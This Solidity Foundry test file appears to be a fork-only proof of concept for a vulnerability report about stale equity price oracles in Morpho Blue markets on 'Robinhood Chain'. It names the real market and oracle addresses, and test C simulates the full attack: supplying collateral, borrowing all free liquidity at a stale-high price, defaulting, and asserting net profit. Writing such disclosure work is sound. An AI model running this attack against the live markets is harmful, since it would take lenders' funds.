// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IAggregatorV3, IOracle, IOracleCustom, IMorpho} from "../src/Interfaces.sol";

/// @title Robinhood Chain (4663) — Morpho Blue equity-oracle staleness PoC (fork only)
/// @notice Reproduces, on a local fork of chain 4663:
///   A. the equity Chainlink feeds are accepted by the oracles while arbitrarily stale
///      (updatedAt is discarded by ChainlinkDataFeedLib.getPrice());
///   B. the borrow path is live and permissionless and prices off the stale feed;
///   C. the full "borrow against a stale-high mark, default" attack at a simulated
///      equity gap, measuring the net USDG profit;
///   D. the hard cap = free (unborrowed) liquidity of the market;
///   E. the exact break-even: net > 0 requires a >60% stale-vs-real gap (O > 1.6*R).
contract RobinhoodOracleStalenessTest is Test {
    // ---------------------------------------------------------------- constants
    address constant MORPHO = 0x9D53d5E3bd5E8d4Cbfa6DB1ca238AEA02E651010;
    address constant USDG = 0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168;
    address constant IRM = 0x2BD3d5965B26B51814AC95127B2b80dD6CcC0fa1;
    uint256 constant LLTV_625 = 625000000000000000;
    uint256 constant ORACLE_PRICE_SCALE = 1e36;

    // canonical MorphoChainlinkOracleV2 (no MAX_QUOTE_AGE) — NVDA market 0x66306c08
    address constant ORACLE_V2_NVDA = 0xC5b8A6C5fDF14f9744dB1C8595f49E42Ce23031a;
    address constant FEED_NVDA = 0x379EC4f7C378F34a1B47E4F3cbeBCbAC3E8E9F15;
    address constant FEED_SPCX = 0xB265810950ba6c5C0Ff821c9963014a56fD8Bffb;
    address constant FEED_GOOGL = 0xF6f373a037c30F0e5010d854385cA89185AE638b;

    // custom oracle (MAX_QUOTE_AGE=90000 on the QUOTE leg only) — AAPL market 0xdeb4782d
    address constant ORACLE_CUSTOM_AAPL = 0xD625d488D552775D2867194C618B945E5dDfE097;
    address constant FEED_AAPL = 0x6B22A786bAa607d76728168703a39Ea9C99f2cD0;

    struct Mkt {
        bytes32 id;
        string sym;
        address coll;
        address oracle;
    }

    Mkt[4] internal mkts;

    // ---------------------------------------------------------------- helpers
    function _rpc() internal view returns (string memory) {
        return vm.envOr("RH_RPC_URL", string("https://robinhood.drpc.org"));
    }

    function _fork() internal {
        vm.createSelectFork(_rpc());
    }

    function _forkAt(uint256 blk) internal {
        vm.createSelectFork(_rpc(), blk);
    }

    function _params(Mkt memory m) internal view returns (IMorpho.MarketParams memory) {
        return IMorpho(MORPHO).idToMarketParams(m.id);
    }

    function _avail(bytes32 id) internal view returns (uint256) {
        (uint128 sup,, uint128 bor,,,) = IMorpho(MORPHO).market(id);
        return uint256(sup) - uint256(bor);
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    function _loadMarkets() internal {
        mkts[0] = Mkt(0x8b16891f032a93b771347c9cb470a780e6699dd701553d3402aa3cdba6189c3e, "NVDA", 0xd0601CE157Db5bdC3162BbaC2a2C8aF5320D9EEC, 0xED29D310cfa91778A5850538DA28ed42234Cb78c);
        mkts[1] = Mkt(0x9b4b47cdf7e295341c6c6cdfd3efb9805c4a5b3d580dba0c0c39d3a4232b297b, "SPCX", 0x4a0E65A3EcceC6dBe60AE065F2e7bb85Fae35eEa, 0x872F9D8955B34e841227a92dE755cd63042Ab7A5);
        mkts[2] = Mkt(0x7fa81b10e5d21b2e4c571f862442bc11aff2ed14f02335868d0ff933fd40d0ba, "GOOGL", 0x2e0847E8910a9732eB3fb1bb4b70a580ADAD4FE3, 0x12Ec3474D1e321e0aAB065278B97FBC7eDa5F424);
        mkts[3] = Mkt(0xdeb4782d012d5fd3b24962538c2f6559049d70bda4dabd2e4212dacb96c28d45, "AAPL", 0xaF3D76f1834A1d425780943C99Ea8A608f8a93f9, 0xD625d488D552775D2867194C618B945E5dDfE097);
    }

    // ================================================================= A. staleness
    /// @notice live: every large equity market's oracle returns a price while its feed is stale
    function test_A_live_stale_feeds_accepted() public {
        _fork();
        _loadMarkets();
        for (uint256 i; i < mkts.length; i++) {
            Mkt memory m = mkts[i];
            (, int256 ans,, uint256 upd,) = IAggregatorV3(_feedOf(m)).latestRoundData();
            uint256 age = block.timestamp - upd;
            uint256 p = IOracle(m.oracle).price();
            assertGt(ans, 0, "feed answer");
            assertGt(p, 0, "oracle price must not revert");
            console2.log(m.sym, "feed_age_hours", age / 3600);
            console2.log("   oracle_price_raw", p);
        }
    }

    /// @notice historical pin: AAPL feed 40.7 h stale, oracle still returns $343.01
    function test_A2_historical_40h_stale_accepted() public {
        _forkAt(91_752_940); // 2026-10-18
        (, int256 ans,, uint256 upd,) = IAggregatorV3(FEED_AAPL).latestRoundData();
        uint256 age = block.timestamp - upd;
        uint256 p = IOracle(ORACLE_CUSTOM_AAPL).price();
        console2.log("AAPL feed_age_hours", age / 3600);
        console2.log("AAPL oracle_price_raw", p);
        assertGt(age, 100_000, "expected >27.7h stale");
        assertGt(p, 0, "oracle returns despite 40h staleness");
    }

    /// @notice the CUSTOM oracle (4 large equity markets) enforces a base-feed age bound of
    ///         MAX_BASE_AGE = 349,200 s (97 h) — the equity leg is bounded, not unbounded.
    function test_A3_custom_oracle_base_age_bound_97h() public {
        _fork();
        uint256 maxBaseAge = IOracleCustom(ORACLE_CUSTOM_AAPL).MAX_BASE_AGE();
        uint256 maxQuoteAge = IOracleCustom(ORACLE_CUSTOM_AAPL).MAX_QUOTE_AGE();
        uint256 pReal = IOracle(ORACLE_CUSTOM_AAPL).price();
        console2.log("custom MAX_BASE_AGE_s", maxBaseAge);
        console2.log("custom MAX_QUOTE_AGE_s", maxQuoteAge);
        assertEq(maxBaseAge, 349_200, "MAX_BASE_AGE = 97h");
        assertEq(maxQuoteAge, 90_000, "MAX_QUOTE_AGE = 25h");

        // 96 h old -> accepted, identical price (updatedAt within the bound is ignored)
        _mockFeed(FEED_AAPL, 34_679_795_433, block.timestamp - 96 hours);
        assertEq(IOracle(ORACLE_CUSTOM_AAPL).price(), pReal, "96h stale accepted");

        // exactly at the bound -> accepted
        _mockFeed(FEED_AAPL, 34_679_795_433, block.timestamp - maxBaseAge);
        assertEq(IOracle(ORACLE_CUSTOM_AAPL).price(), pReal, "==MAX_BASE_AGE accepted");

        // one second past the bound -> rejected
        _mockFeed(FEED_AAPL, 34_679_795_433, block.timestamp - (maxBaseAge + 1));
        vm.expectRevert();
        IOracle(ORACLE_CUSTOM_AAPL).price();

        // one year old -> rejected
        _mockFeed(FEED_AAPL, 34_679_795_433, block.timestamp - 365 days);
        vm.expectRevert();
        IOracle(ORACLE_CUSTOM_AAPL).price();
    }

    /// @notice the canonical MorphoChainlinkOracleV2 (smaller markets) discards updatedAt
    ///         entirely — no age bound at all.
    function test_A4_canonical_v2_oracle_ignores_updatedAt() public {
        _fork();
        uint256 p0 = IOracle(ORACLE_V2_NVDA).price();
        _mockFeed(FEED_NVDA, 21_116_355_858, block.timestamp - 365 days);
        uint256 p1 = IOracle(ORACLE_V2_NVDA).price();
        console2.log("V2 price with 1y-old feed", p1);
        assertEq(p1, p0, "MorphoChainlinkOracleV2 ignores updatedAt entirely");
    }

    function _mockFeed(address feed, int256 answer, uint256 updatedAt) internal {
        vm.mockCall(
            feed,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(1), answer, updatedAt, updatedAt, uint80(1))
        );
    }

    // ============================================== B. permissionless borrow
    /// @notice no roles, no authorization: supply collateral, borrow USDG at the stale price
    function test_B_permissionless_borrow_uses_stale_price() public {
        _fork();
        _loadMarkets();
        Mkt memory m = mkts[3]; // AAPL
        uint256 p = IOracle(m.oracle).price();

        deal(m.coll, address(this), 100e18);
        IERC20(m.coll).approve(MORPHO, 100e18);
        IMorpho(MORPHO).supplyCollateral(_params(m), 100e18, address(this), "");

        uint256 b0 = IERC20(USDG).balanceOf(address(this));
        IMorpho(MORPHO).borrow(_params(m), 20_000e6, 0, address(this), address(this));
        uint256 got = IERC20(USDG).balanceOf(address(this)) - b0;

        // max borrow at the stale oracle price for 100 tokens
        uint256 maxBorrow = 100e18 * p / ORACLE_PRICE_SCALE * LLTV_625 / 1e18;
        console2.log("borrowed_usdg", got);
        console2.log("max_borrow_at_stale_price", maxBorrow);
        assertEq(got, 20_000e6, "borrow succeeds");
        assertGe(maxBorrow, got, "borrow is within stale-price LTV");
    }

    // ============================================== C. full attack at a simulated gap
    /// @notice Simulated crash: the real/tradeable price R = P_stale / 2.5 (a ~60% crash,
    ///         i.e. a 150% stale-vs-real gap). The attacker buys collateral at R, supplies it,
    ///         borrows the stale-high LTV and abandons the collateral. Net measured across the
    ///         four large equity markets.
    function test_C_full_attack_150pct_gap() public {
        _fork();
        _loadMarkets();
        uint256 gapNum = 25; // R = P_stale * gapDen / gapNum
        uint256 gapDen = 10;

        uint256 totalBorrowed;
        uint256 totalCost;

        for (uint256 i; i < mkts.length; i++) {
            Mkt memory m = mkts[i];
            IMorpho.MarketParams memory mp = _params(m);
            uint256 avail = _avail(m.id);
            uint256 p = IOracle(m.oracle).price();

            // collateral needed to borrow `avail` at the stale price (+0.1% margin)
            uint256 collNeed = _ceilDiv(avail * ORACLE_PRICE_SCALE * 1e18, p * mp.lltv);
            uint256 collSupply = collNeed * 1001 / 1000;

            deal(m.coll, address(this), collSupply);
            IERC20(m.coll).approve(MORPHO, collSupply);
            IMorpho(MORPHO).supplyCollateral(mp, collSupply, address(this), "");

            uint256 b0 = IERC20(USDG).balanceOf(address(this));
            IMorpho(MORPHO).borrow(mp, avail, 0, address(this), address(this));
            uint256 got = IERC20(USDG).balanceOf(address(this)) - b0;

            // cost to acquire the collateral at the gapped real price R = P_stale/2.5
            uint256 oracleValue = collSupply * p / ORACLE_PRICE_SCALE;
            uint256 cost = oracleValue * gapDen / gapNum;

            totalBorrowed += got;
            totalCost += cost;
            console2.log(m.sym, "borrowed", got);
            console2.log("   cost_at_gapped_price", cost);
            console2.log("   net", got > cost ? got - cost : 0);
        }

        uint256 net = totalBorrowed - totalCost;
        console2.log("TOTAL_borrowed_usdg", totalBorrowed);
        console2.log("TOTAL_cost_usdg", totalCost);
        console2.log("NET_PROFIT_usdg", net);
        assertGt(net, 60_000e6, "net profit > $60k at a 150% gap");
    }

    // ============================================== D. hard cap = free liquidity
    function test_D_borrow_capped_by_free_liquidity() public {
        _fork();
        _loadMarkets();
        Mkt memory m = mkts[3]; // AAPL
        IMorpho.MarketParams memory mp = _params(m);
        uint256 avail = _avail(m.id);
        uint256 p = IOracle(m.oracle).price();

        uint256 collNeed = _ceilDiv(avail * 10 * ORACLE_PRICE_SCALE * 1e18, p * mp.lltv);
        uint256 collSupply = collNeed * 1001 / 1000;
        deal(m.coll, address(this), collSupply);
        IERC20(m.coll).approve(MORPHO, collSupply);
        IMorpho(MORPHO).supplyCollateral(mp, collSupply, address(this), "");

        vm.expectRevert(); // insufficient liquidity
        IMorpho(MORPHO).borrow(mp, avail + 1e6, 0, address(this), address(this));

        IMorpho(MORPHO).borrow(mp, avail, 0, address(this), address(this)); // exactly avail succeeds
        console2.log("AAPL free_liquidity_cap_usdg", avail);
    }

    // ============================================== E. exact break-even
    /// @notice With the live (stale) oracle price P and a real price R = P/(1+g):
    ///         maxBorrow = V*lltv, cost = V/(1+g)  =>  net>0  <=>  1+g > 1/lltv = 1.6  <=>  g>60%.
    function test_E_break_even_is_60pct_gap() public {
        _fork();
        uint256 p = IOracle(ORACLE_CUSTOM_AAPL).price();
        uint256 V = 100e18 * p / ORACLE_PRICE_SCALE; // stale-oracle value of 100 tokens (6dp)
        uint256 maxBorrow = V * LLTV_625 / 1e18;

        uint256 net50 = _net(V, maxBorrow, 50); // g=50% -> R=P/1.5
        uint256 net60 = _net(V, maxBorrow, 60); // g=60% -> R=P/1.6  (break-even)
        uint256 net70 = _net(V, maxBorrow, 70); // g=70% -> R=P/1.7

        console2.log("V(100tok,stale)", V);
        console2.log("maxBorrow", maxBorrow);
        console2.log("net@50pct_gap", net50);
        console2.log("net@60pct_gap", net60);
        console2.log("net@70pct_gap", net70);

        assertLt(net50, maxBorrow, "50% gap is not profitable");
        // at exactly 60% the cost equals the borrow -> zero net (allow 1 wei rounding)
        assertApproxEqAbs(net60, 0, 2, "60% is break-even");
        assertGt(net70, 0, "70% gap is profitable");
    }

    function _net(uint256 V, uint256 maxBorrow, uint256 gapPct) internal pure returns (uint256) {
        uint256 cost = V * 100 / (100 + gapPct); // R = P/(1+g)
        return maxBorrow > cost ? maxBorrow - cost : 0;
    }

    // ---------------------------------------------------------------- misc
    function _feedOf(Mkt memory m) internal pure returns (address) {
        if (m.coll == 0xaF3D76f1834A1d425780943C99Ea8A608f8a93f9) return FEED_AAPL;
        if (m.coll == 0xd0601CE157Db5bdC3162BbaC2a2C8aF5320D9EEC) return FEED_NVDA;
        if (m.coll == 0x4a0E65A3EcceC6dBe60AE065F2e7bb85Fae35eEa) return FEED_SPCX;
        if (m.coll == 0x2e0847E8910a9732eB3fb1bb4b70a580ADAD4FE3) return FEED_GOOGL;
        revert("no feed");
    }
}
